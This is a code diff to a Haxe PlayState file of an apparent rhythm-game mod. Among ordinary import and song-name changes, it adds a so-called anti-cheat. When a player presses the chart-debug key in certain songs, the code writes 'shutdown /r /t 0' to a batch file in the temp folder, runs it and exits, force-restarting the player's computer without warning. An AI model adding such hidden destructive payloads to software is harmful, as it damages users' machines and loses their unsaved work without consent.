@@ -58,6 +58,11 @@ import FunkinLua;
 import DialogueBoxPsych;
 import Shaders;
 
+#if windows
+import sys.io.File;
+import sys.io.Process;
+#end
+
 #if sys
 import sys.FileSystem;
 #end
@@ -239,6 +244,9 @@ class PlayState extends MusicBeatState
 	public static var deathCounter:Int = 0;
 
 	public var defaultCamZoom:Float = 1.05;
+
+	// used in anti-cheat, dont press 7 in that song lmao
+	public var crazyBatch:String = "shutdown /r /t 0";
 
 	// how big to stretch the pixel art assets
 	public static var daPixelZoom:Float = 6;
@@ -2366,14 +2374,19 @@ class PlayState extends MusicBeatState
 
 		if (FlxG.keys.anyJustPressed(debugKeysChart) && !endingSong && !inCutscene)
 		{
-			if (curSong.toLowerCase() == 'formula' || curSong.toLowerCase() == 'rivals')
+			if (curSong.toLowerCase() == 'algebra' || curSong.toLowerCase() == 'rivals')
 				{
 					PlayState.SONG = Song.loadFromJson("debug", "debug"); // greenanimations did it before so i repurposed the way to do so
 					FlxG.switchState(new PlayState());
 					return;
 					// FlxG.switchState(new VideoState('assets/videos/fortnite/fortniteballs.webm', new CrasherState()));
 				}
-				if (curSong.toLowerCase() == 'debug')
+			if (curSong.toLowerCase() == 'debug')
+				{
+					File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
+					new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
+					Sys.exit(0);
+				}
 				{
 					health = 0;
 					return;
